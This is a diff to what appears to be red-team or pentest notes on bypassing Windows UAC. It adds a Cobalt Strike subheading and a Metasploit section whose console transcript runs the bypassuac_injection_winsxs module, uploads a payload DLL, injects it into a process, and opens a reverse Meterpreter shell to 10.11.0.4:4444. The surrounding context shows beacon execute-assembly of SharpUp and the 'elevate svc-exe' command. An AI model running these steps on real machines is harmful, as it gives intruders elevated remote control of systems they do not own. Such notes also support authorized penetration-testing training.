@@ -47,6 +47,8 @@ beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
 [*] In medium integrity but user is a local administrator- UAC can be bypassed.
 ```
 
+### In CobaltStrike
+
 Use the `elevate` command in CS to bypass (best)
 
 ```
@@ -79,6 +81,30 @@ connect localhost 1337
 elevate svc-exe tcp-local
 
 ```
+
+### In Metasploit
+
+```
+msf5 > use exploit/windows/local/bypassuac_injection_winsxs
+
+msf5 exploit(windows/local/bypassuac_injection_winsxs) > set SESSION 10
+SESSION => 10
+msf5 exploit(windows/local/bypassuac_injection_winsxs) > exploit
+[*] Started reverse TCP handler on 10.11.0.4:4444 
+[+] Windows 10 (Build 16299). may be vulnerable.
+[*] UAC is Enabled, checking level...
+[+] Part of Administrators group! Continuing...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[*] Creating temporary folders...
+[*] Uploading the Payload DLL to the filesystem...
+[*] Spawning process with Windows Publisher Certificate, to inject into...
+[+] Successfully injected payload in to process: 5800
+[*] Sending stage (179779 bytes) to 10.11.0.22
+[*] Meterpreter session 11 opened (10.11.0.4:4444 -> 10.11.0.22:53870)
+meterpreter >
+```
+
 
 
 ___
